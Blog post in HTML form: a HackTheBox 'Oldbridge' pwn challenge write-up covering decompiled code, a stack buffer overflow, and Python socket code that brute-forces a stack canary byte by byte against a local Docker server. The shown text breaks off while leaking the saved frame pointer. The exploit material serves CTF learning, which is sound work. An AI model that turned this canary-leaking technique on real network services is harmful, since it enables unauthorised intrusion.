@@ -1,0 +1,1088 @@
+<!doctype html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>HackTheBox (HTB) Oldbridge pwn challenge writeup  // Shaked Delarea</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.129.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Shaked Delarea AUTHOR" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBox (HTB) Oldbridge pwn challenge writeup ">
+  <meta name="twitter:description" content="Oldbridge is a retired PWN challenge from Hack The Box. Here’s how I solved it:
+Binary Analysis We get a binary copy of the program that runs on the server so we can run it locally and test it. In this challenge I use Docker to setup the local server for easy debug and testing.
+Like previous challenges, I like to start with a binary examination on program… see what it does and where is the exploit.">
+
+    <meta property="og:url" content="http://localhost:1313/posts/blog-2/">
+  <meta property="og:site_name" content="Shaked Delarea">
+  <meta property="og:title" content="HackTheBox (HTB) Oldbridge pwn challenge writeup ">
+  <meta property="og:description" content="Oldbridge is a retired PWN challenge from Hack The Box. Here’s how I solved it:
+Binary Analysis We get a binary copy of the program that runs on the server so we can run it locally and test it. In this challenge I use Docker to setup the local server for easy debug and testing.
+Like previous challenges, I like to start with a binary examination on program… see what it does and where is the exploit.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-07-27T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="http://localhost:1313/"><img class="app-header-avatar" src="/desk.jpg" alt="Shaked Delarea AUTHOR" /></a>
+      <span class="app-header-title">Shaked Delarea</span>
+      <p>Security Researcher</p>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+      </nav>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/gohugoio" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/gohugoio" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="mailto:shaqedelarea@gmail.com" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Email</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox (HTB) Oldbridge pwn challenge writeup </h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 27, 2024
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          30 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Oldbridge is a retired PWN challenge from Hack The Box. Here&rsquo;s how I solved it:</p>
+<h3 id="binary-analysis">Binary Analysis</h3>
+<p>We get a binary copy of the program that runs on the server so we can run it locally and test it.
+In this challenge I use Docker to setup the local server for easy debug and testing.</p>
+<p>Like previous challenges, I like to start with a binary examination on program&hellip; see what it does and where is the exploit.</p>
+<p>Let&rsquo;s take a look at the <code>main</code>:
+Thanks to Ghidra&rsquo;s decompiler we can get general idea of the <code>main</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* ...  */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>    local_50 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    local_40 <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(server_sd,<span style="color:#f92672">&amp;</span>local_28,<span style="color:#f92672">&amp;</span>local_50);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_40 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;accept&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(server_sd);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    local_3c <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_3c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_3c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">check_username</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(local_40,<span style="color:#e6db74">&#34;Username found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(local_40);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(local_40);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;fork&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(local_40);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(server_sd);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* ... */</span>
+</span></span></code></pre></div><p>While it may seem confusing at first, the main loop here just <code>fork</code>s on each new connection and calls <code>check_username</code> on the child process (the parent does not enter that if statement and returns back to listening to more clients connecting).</p>
+<p>No vulnerable code so far, as far as I can tell - we didn&rsquo;t even get to the heart of the program yet. Let&rsquo;s dive to <code>check_username</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">check_username</span>(<span style="color:#66d9ef">int</span> param_fd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> sVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_420;
+</span></span><span style="display:flex;"><span>  byte local_418 [<span style="color:#ae81ff">1032</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write</span>(param_fd,<span style="color:#e6db74">&#34;Username: &#34;</span>,<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(param_fd,local_418,<span style="color:#ae81ff">0x420</span>);
+</span></span><span style="display:flex;"><span>  local_420 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (local_420 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)sVar2) {
+</span></span><span style="display:flex;"><span>    local_418[(<span style="color:#66d9ef">long</span>)local_420] <span style="color:#f92672">=</span> local_418[(<span style="color:#66d9ef">long</span>)local_420] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>;
+</span></span><span style="display:flex;"><span>    local_420 <span style="color:#f92672">=</span> local_420 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">memcmp</span>(local_418,<span style="color:#e6db74">&#34;il{dih&#34;</span>,<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (ulong)(iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After a little bit of cleaning and variable renaming we can see the picture more clearly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ulong <span style="color:#a6e22e">check_username</span>(<span style="color:#66d9ef">int</span> param_fd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> sVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_420;
+</span></span><span style="display:flex;"><span>  byte local_418 [<span style="color:#ae81ff">1032</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write</span>(param_fd,<span style="color:#e6db74">&#34;Username: &#34;</span>,<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(param_fd,local_418,<span style="color:#ae81ff">0x420</span>);
+</span></span><span style="display:flex;"><span>  local_420 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (local_420 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)sVar2) {
+</span></span><span style="display:flex;"><span>    local_418[(<span style="color:#66d9ef">long</span>)local_420] <span style="color:#f92672">=</span> local_418[(<span style="color:#66d9ef">long</span>)local_420] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>;
+</span></span><span style="display:flex;"><span>    local_420 <span style="color:#f92672">=</span> local_420 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">memcmp</span>(local_418,<span style="color:#e6db74">&#34;il{dih&#34;</span>,<span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (ulong)(iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The interesting part here is:</p>
+<ol>
+<li>The <code>read</code> calls fill in a buffer with <code>0x420 = 1056</code> bytes <strong>but</strong> the buffer it stores it into is only 1032! Buffer overflow detected! are we done?</li>
+<li>Every single bit of the input from the user is XORed with <code>0xdz</code>, then the start of the string is checked against the &ldquo;hidden&rdquo; username: <code>il{dih</code>. <!-- raw HTML omitted -->
+To reveal the real username we can XOR that text with <code>0xd</code> again. We can use a simple Python one-liner we can figure out what is the username:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(ord(t) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;il{dih&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;davide&#39;</span>
+</span></span></code></pre></div><p>We have enough information about that binary, now I feel it&rsquo;s time to move to live testing and playing around with it.</p>
+<p>I should note that usually the binary examination is much more complex, and starting with the &ldquo;playing around&rdquo; phase is probably the smarter choice for pwn challenges in the future. But hey, I&rsquo;m here to learn.</p>
+<h3 id="setting-up-our-test-server-using-docker">Setting up our test server (using Docker)</h3>
+<p>Docker is a nice tool we can use to setup a linux environment for the process to run so we can play around with it.
+To do that, I&rsquo;ve downloaded the demo Ubuntu image, installed gdb,peda and more tools on it, and run the following command:</p>
+<p><code>$ docker run --rm -it --cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined -v ~/Desktop:/from_host -w /app new_ubuntu</code></p>
+<ul>
+<li><code>--cap-add=SYS_PTRACE -p 1337:1337 --security-opt seccomp=unconfined</code> is used for allowing the container to run and debug processes, while connecting the 1337 port between the host (our machine) and the container(which will run the server). That way we can access the server directly from our machine as the client</li>
+<li><code>-v ~/Desktop:/from_host</code> Give the container access to the volume specified from the host. So the container may access our <code>oldbridge</code> binary</li>
+</ul>
+<p>After running it, we can test the program a little bit:</p>
+<pre tabindex="0"><code>/Users/shaked$ nc localhost 1337
+Username: gimme root
+/Users/shaked$ nc localhost 1337
+Username: davide
+Username found!
+/Users/shaked$ nc localhost 1337
+Username: davideasdasdasdasdasdasdasd
+Username found!
+</code></pre><p>We know that our buffer is 1032 bytes long, what happens when we overflow it?<!-- raw HTML omitted -->
+<code>$ python -c 'print &quot;A&quot;*1032' | nc localhost 1337</code> (1032 &ldquo;A&quot;s plus a newline character = 1033 bytes)</p>
+<p>We get nothing back, and if we look at the server:</p>
+<pre tabindex="0"><code>root@04a0530e836b:/from_host/programming2/challenges/hack_the_box/oldbridge# ./oldbridge 1337
+*** stack smashing detected ***: &lt;unknown&gt; terminated
+</code></pre><h3 id="problem-1---stack-canary">Problem #1 - Stack canary</h3>
+<p>What had happend? why not SIGSEGV? If we go back to the source code again we can see that there&rsquo;s a use of a stack guard, a stack canary value. A stack canary is a random value that is placed right before the stack frame ends. That is, it is placed above the old frame pointer and the return address.</p>
+<p>When the function is done, there&rsquo;s a check between the stack canary and the location which is it was originally stored (which we cannot override) and if there&rsquo;s a mismatch - the program knows someone has messed up the stack and exit <em>un-gracefully</em>;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><h3 id="problem-2---position-independent-executable-pie">Problem #2 - Position Independent Executable (PIE)</h3>
+<p>Usually when you compile a simple program, the compiler can assume the regular address space for the program headers (.text section, .bss, .data, etc&hellip;) and during runtime the system would not randomize that part (as we saw in ROPme).</p>
+<p>But - when you compile a library, you compile it as PIE, so the code inside it may be loaded into any address in the future.</p>
+<p>You can, if you like - compile a program with the <code>-fPIE</code> flag and it would still run perfectly. And it would have effectively randomize the code section of our binary during runtime. This makes things hard for us in finding gadgets to use, because everytime the program loads, a new address is issued for all of the variables! <strong>But</strong> let us not forget that the randomization is *<em>page based</em>, and only the base of the section is randomized.</p>
+<p>So if we would know the base which the .text section was loaded into, we can figure out where the rest of the symbols are by looking at the binary given to us.</p>
+<h3 id="problem-3---aslr">Problem #3 - ASLR</h3>
+<p>Same as ROPme, makes it hard for us to find gadgets, not just in the .text section - but also from libc or the stack</p>
+<h3 id="problem-4---libc-version">Problem #4 - Libc version</h3>
+<p>Even if we would defeat ASLR, we still need to know the offsets of gadgets for us to use.</p>
+<h3 id="one-solution-for-all">One solution for all</h3>
+<p>In the <code>main()</code>, before any client is being processed, the process is <code>fork</code>ed.</p>
+<p><code>fork()</code> is copying the entire process memory to a child except for 1 register, the <code>rax</code>. This is so that the child would be able to tell that it was forked.</p>
+<p><strong>This is GREAT for us because this means that every child created, and the parent as well, will share the same libc base, .text section base, the stack canary and even the stack base!</strong></p>
+<p>So what do we do? first we have to leak the canary, because it is the first value that is being overriden after the buffer overflows.</p>
+<p>Our strategy would be to try and override a <em>single</em> byte from the canary, one at a time - and if we get a valid repsponse from the server( &ldquo;Username found!&rdquo;) we can learn that the system thinks the canary is intact and we effectively learned a byte from the canary!</p>
+<p>We can now start writing our exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVER <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(p):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Username found!&#34;</span> <span style="color:#f92672">in</span> line
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_next_byte</span>(prefix):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> test_byte <span style="color:#f92672">in</span> [chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> send_payload(prefix <span style="color:#f92672">+</span> test_byte):
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found:&#34;</span>, hex(ord(test_byte))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> prefix <span style="color:#f92672">+</span> test_byte
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    leak_next_byte(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>We have a small function that sends a payload and reports if the payload is good (by checking if the server returned the &ldquo;Username found!&rdquo; message). If the server fails - no message will be sent back and we would know that we have broken the stack canary.<!-- raw HTML omitted -->
+We use <code>leak_next_byte</code> to leak the next 8 bytes from the stack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_canary</span>(prefix):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> prefix
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> leak_next_byte(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:]
+</span></span></code></pre></div><pre tabindex="0"><code>$ python exploit.py 
+Found: 0xd
+Found: 0xcc
+Found: 0x75
+Found: 0xf0
+Found: 0x95
+Found: 0xff
+Found: 0x6c
+Found: 0xcb
+Canary:
+0xcb6cff95f075cc0dL
+</code></pre><p>Note: the canary we display is the canary after XORed with <code>0xd</code>. This is because our byte that we test are XORed and then placed to the canary.</p>
+<h3 id="whats-past-the-canary">What&rsquo;s past the canary?</h3>
+<p>After the canary there&rsquo;s the old frame pointer. Which usually we find it insignificant because we want to go straight ahead to override the return address which located right after it.</p>
+<p>But in here, we do not have enough stack space for a long ROP chain like in ROPme, we can override the buffer (1032 bytes), the canary (1040), the old rbp (1048) and the return address (1056) and <em>that&rsquo;s it</em>.</p>
+<p>Before we think about how to jump around in the program, let&rsquo;s use the previous technique to leak the old RBP on the stack as well as the return address.<!-- raw HTML omitted -->
+We can do that because if we want to receive &ldquo;Username found!&rdquo; from the server, the <code>main()</code> function would need the right stack pointer set to load values from the stack to those <code>write</code> calls. if we mess it up even a little bit, we can notice it in our client side by not receiving the message.</p>
+<p><strong>Leaking the return address is a little bit more difficult</strong>. Because we start by overriding the least significant byte, the program might return to some other location in the <code>main</code>, it could be another <code>fork</code> or <code>accept</code> and make things be a little less predictible for us. <!-- raw HTML omitted -->
+But - since the randomization is only effective for the least 12 bits of the return address, the first byte will definitely not change:</p>
+<p>The return address from <code>check_username</code> is:</p>
+<pre tabindex="0"><code>   0x0000555555554eca &lt;+561&gt;:	call   0x555555554b6f &lt;check_username&gt;
+   0x0000555555554ecf &lt;+566&gt;:	test   eax,eax
+</code></pre><p>So it would always end with <code>0xcf</code>!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_n_bytes</span>(prefix, n):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> prefix
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> leak_next_byte(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload[<span style="color:#f92672">-</span>n:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking canary&#34;</span>
+</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> leak_n_bytes(payload, <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking old RBP&#34;</span>
